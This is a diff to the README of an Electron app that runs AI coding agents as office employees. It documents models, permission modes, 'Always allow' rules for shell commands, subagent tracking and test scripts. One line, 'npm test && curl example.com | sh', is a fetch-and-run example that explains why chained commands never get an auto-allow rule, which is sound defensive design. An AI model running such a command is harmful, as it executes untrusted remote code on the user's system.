@@ -16,7 +16,7 @@ An Electron window opens with the office. On first run, click **Choose a folder*
 | Variable | Default | Effect |
 | --- | --- | --- |
 | `OFFICE_START_LEVEL` | `1` | Level (and seat count) of a freshly created company. |
-| `OFFICE_CLAUDE_MODEL` | `claude-sonnet-5-5` | Model for Claude Code employees. Use `claude-haiku-4-5-20251001` for cheap runs. |
+| `OFFICE_CLAUDE_MODEL` | `claude-sonnet-5-5` | Model a new Claude Code employee starts on when nobody picks one. An employee keeps the model it was hired with. Use `claude-haiku-4-5-20251001` for cheap runs. |
 | `OFFICE_BASH=allow` | unset | Skip asking the owner before shell commands. |
 | `OFFICE_DEBUG=1` | unset | Log MCP tool calls, each Claude session start with its memory digest, owner answers, and every message from the window. |
 | `OFFICE_DATA_DIR` | Electron `userData` | Where the company, the memory notes, and the app profile live. Tests point it at a scratch folder. |
@@ -45,6 +45,7 @@ Click an employee, on the avatar or the name tag, for a menu with **Open chat** 
 - The office holds every question an employee asks you. `src/main/office/inbox.ts` keeps a first-in-first-out line per employee, so a harness that asks permission for two tools at once shows one card at a time. When the harness cancels a call, the card is withdrawn.
 - Every employee reaches the office through one MCP server, whatever harness it runs on. Notes come from one store. Both are described below.
 - Each Claude Code employee is one long-lived Agent SDK session that connects to the office MCP server over HTTP. Shell commands also become questions ("Can I run `npm test`?"). Claude's own auto memory is off.
+- `src/main/office/adapters/types.ts` is the contract for a harness (`Harness`, `SessionHost`, `EmployeeSession`). Its comments say what each call must do, so an adapter can be written from that file alone.
 - ChatGPT (Codex) and Hermes show in the hire menu when installed, but cannot be hired until their adapters land.
 - Voice input does not work yet: Electron has no speech recognition backend. Type with Enter for now. Voices use `speechSynthesis`.
 
@@ -66,6 +67,41 @@ Click an employee, on the avatar or the name tag, for a menu with **Open chat** 
 | `forget` | `scope`, `id` | Deletes a note. |
 
 Claude Code aborts an HTTP MCP call that sends no response or progress for 5 minutes. Setting `MCP_TOOL_TIMEOUT` alone does not lift that limit. The Claude adapter sets a per-server `timeout` of one day, which does. It also sets `CLAUDE_CODE_MCP_AUTO_BACKGROUND_MS=0`, because a shell that exports `CLAUDE_AUTO_BACKGROUND_TASKS` makes Claude background any call that runs past 2 minutes. `verify/claude-timeout-probe.ts` shows both behaviors against a real session.
+
+## Models, permissions and sessions
+
+Every employee carries the model its harness runs on, a permission policy (`{ mode, alwaysAllow }`) and the subagents running for it. `company.json` also holds the company settings. Those are the seat ceiling for the company's level, a default model for each provider, and the default mode for new hires, which is `inherit`. The window changes them with these messages, which `src/main/ipc.ts` validates.
+
+| Message | Effect |
+| --- | --- |
+| `hire` with `model` | The new employee starts on that model. Without one, it starts on the company default for its provider, then on the harness default (`OFFICE_CLAUDE_MODEL` for Claude Code). |
+| `set_model` | Changes the employee's model. A live session switches from its next turn. Claude refuses a model its bundled Claude Code does not describe, and the log says so. |
+| `set_permissions` | Changes the employee's mode (`inherit`, `ask`, `auto` or `yolo`). |
+| `answer` with `always` | On a permission card, adds an Always-allow rule for that employee. |
+| `remove_allow_rule` | Removes one rule from the employee. |
+| `load_models` | Asks a harness for its model list. Each snapshot carries a catalog per provider, either `unknown`, `loading`, `ready` or `error`. |
+| `fresh_session` | Stops the employee's session, drops its open questions, clears its `sessionId` and starts a new session with no memory of the conversation. Notes, model and rules stay. |
+
+Until the four modes map onto Claude Code's own permission modes (unit F1 in `docs/beta-plan.md`), a Claude Code employee runs in `acceptEdits` mode whatever its mode says.
+
+### Always allow
+
+An answer that allows a permission card can carry `always: true`. The office then adds a rule for that employee. It checks the employee's rules before it puts any permission card on the desk, so every harness behaves the same. A request that a rule covers is answered Allow at once, with no card, and the log names the rule.
+
+- A shell command makes a `command` rule from its executable and its subcommand when it has one. `npm test -- --watch` gives `npm test`, and `git status --short` gives `git status`. A rule covers every command that starts with the same words.
+- Any other tool makes a `tool` rule, which covers every use of that tool.
+- A command that can chain, substitute or redirect never makes a rule, and no rule covers it, because a rule for `npm test` must not allow `npm test && curl example.com | sh`. That covers `; & | < > ( ) $`, backticks, backslashes and line breaks, except where quotes hold them as plain text. Single quotes hold all of them, and double quotes hold all but `$`, backticks and backslashes. Always allow on such a command allows it once.
+- A harness sends a shell command as the tool `Bash` with the bare command in `detail`. `src/shared/permissions.ts` holds the rules and their matching, so the card can import them too.
+
+### Subagents
+
+A subagent that an employee starts is listed in `employee.subagents` while it runs, in start order, each with the id of its parent or `null`. The office never writes them to `company.json` and clears them when a session starts over.
+
+The Claude adapter reports each `Agent` or `Task` tool call as a subagent, labelled with its description. It ends the subagent at the `task_notification` for that call. It does not end it at the tool result, because Claude runs subagents in the background by default and the tool result only says the subagent launched. A subagent can therefore run while its employee is idle.
+
+## Company file
+
+`company.json` migrates when the app loads it. A file from before models, permissions and settings gets each new field from one function, `migrate` in `src/main/office/company.ts`. Each employee gets the harness default model (`OFFICE_CLAUDE_MODEL` for Claude Code), the `inherit` mode and no rules, and the company gets settings with seats at the ceiling of its level. The app writes the migrated file back, and loading that file again writes the same bytes. `verify/fixtures/company-v1.json` is a real file from before the change.
 
 ## Memory
 
@@ -94,8 +130,10 @@ node --no-warnings verify/walk-check.mjs
 node --no-warnings verify/chat-check.mjs
 node verify/mcp-check.ts
 node verify/office-check.ts
+node verify/claude-check.ts
 node verify/cdp.mjs verify/e2e-real.mjs
 node verify/cdp.mjs verify/e2e-nav.mjs
+node verify/cdp.mjs verify/e2e-contract.mjs
 node verify/cdp.mjs verify/e2e-memory.mjs
 node verify/cdp.mjs verify/e2e-queue.mjs
 node verify/cdp.mjs verify/e2e-long-wait.mjs
@@ -105,9 +143,11 @@ node verify/cdp.mjs verify/e2e-long-wait.mjs
 - `verify/walk-check.mjs` needs no model or Electron. It runs the real sim and store. It checks click walks that detour around desks, steering keys winning over a walk, going to an employee and re-planning when they move, and employees routing around the meeting room: a new hire sits, a blocked employee arrives with the owner outside or inside, and a closed door keeps everyone at their desk until it opens.
 - `verify/chat-check.mjs` needs no model or Electron. It checks that what the owner says and what an employee says land in that employee's transcript, in order, capped at 200 lines.
 - `verify/mcp-check.ts` needs no model. It starts the MCP server, the inbox, and the memory store in a scratch folder, and drives them with an MCP client. It checks the Origin, Host, and token rules, `ask_owner` waiting, cancelling, and queueing, and the memory limits, secret refusal, block visibility, firing, and the digest size. It exits 1 on any failed check.
-- `verify/office-check.ts` needs no model or Electron either. It runs the real `Office` with a scripted stand-in for a harness and checks what you would see: the cards, their order, where an employee goes back to after an answer or a cancel, and what firing and resetting do to sessions and notes.
-- `verify/e2e-real.mjs` launches the built app against a scratch data folder and a scratch git repo, then does everything through the UI. It creates a block through the stubbed picker, hires a Claude Code employee, and gives it a task by typing. The employee walks over to ask, the script answers on the card, and then checks the file the agent wrote. It also checks the main log for `ask_owner` arriving over HTTP. A second task covers a shell permission card and a whiteboard diagram. Screenshots land in `/tmp/office-shots`.
+- `verify/office-check.ts` needs no model or Electron either. It runs the real `Office` with a scripted stand-in for a harness and checks what you would see: the cards, their order, where an employee goes back to after an answer or a cancel, and what firing and resetting do to sessions and notes. It also migrates `verify/fixtures/company-v1.json`, tables how a card becomes an Always-allow rule and what a rule covers, and checks each message in the table above, subagents, and that nothing ephemeral reaches the file.
+- `verify/claude-check.ts` needs no model or network. It runs the real Claude adapter against a scripted stand-in for the Agent SDK's `query()`. It checks what the adapter starts the SDK with, the permission card bodies, how it delivers a model switch and a rule change, and how it reports subagents. The foreground, background and interrupted subagent streams follow what a real Haiku session sent with SDK 0.3.283. The nested one follows the SDK's documented shapes.
+- `verify/e2e-real.mjs` launches the built app against a scratch data folder and a scratch git repo, then does everything through the UI. It creates a block through the stubbed picker, hires a Claude Code employee, and gives it a task by typing. The employee walks over to ask, the script answers on the card, and then checks the file the agent wrote. It also checks the main log for `ask_owner` arriving over HTTP. A second task covers a shell permission card. A third makes the employee use its `Agent` tool once, and checks that the subagent shows on the employee while it runs, for as long as it runs, and is gone after, and that `company.json` never holds it. A whiteboard diagram closes the run. Screenshots land in `/tmp/office-shots`.
 - `verify/e2e-nav.mjs` uses real mouse and key events only. In the Overview it clicks the floor across a desk and checks the owner arrives, drags to turn the view without walking, and cancels a walk with a key. It clicks an employee's avatar and name tag for the menu, closes it with Esc and with a click elsewhere, walks to the employee with "Go to", and opens the chat, sends a message and waits for the real reply. Screenshots of the marker, the menu and the chat land in `/tmp/office-shots`.
+- `verify/e2e-contract.mjs` starts the app on the old-format company file and drives the messages above through the real IPC boundary with real Claude employees. It checks the migration, a refused bad mode, Always allow with no card the second time, `remove_allow_rule`, a live `set_model` (the next turn's `init` shows the new model), a refused model reported in the log, a `fresh_session` on a stale `sessionId`, and a background subagent that outlives the turn that launched it.
 - `verify/e2e-memory.mjs` tells an employee a fact, quits the app, deletes the employee's `sessionId`, starts the app again on the same data folder, and asks a question only the notes can answer.
 - `verify/e2e-queue.mjs` makes two subagents ask permission at the same moment, and checks that the second card waits behind the first.
 - `verify/e2e-long-wait.mjs` leaves the owner silent for 150 seconds before answering. Run it with `OFFICE_LONG_WAIT_S=330` to go past Claude Code's 5 minute default.
